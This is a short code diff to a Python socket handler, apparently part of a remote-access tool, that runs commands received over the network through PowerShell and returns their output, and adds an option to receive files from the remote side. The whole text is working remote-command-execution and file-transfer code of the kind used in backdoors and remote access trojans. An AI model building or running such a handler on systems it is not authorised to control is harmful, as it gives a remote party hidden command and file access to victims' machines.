@@ -7,6 +7,7 @@ def handleConnection(my_socket):
     
 
     while(True):
+        
         user_input = my_socket.recieve_data()
         if (user_input == '1'):
             print("Running Commands")
@@ -14,6 +15,9 @@ def handleConnection(my_socket):
             output = subprocess.run(["powershell" , command] , shell= True , capture_output= True ) 
 
             my_socket.send_data(output.stdout.decode("UTF-8"))
+        elif (user_input == "2"):
+            print("Waiting for files : ")
+            my_socket.recieve_file()
 
         elif(user_input == '99'):
             break
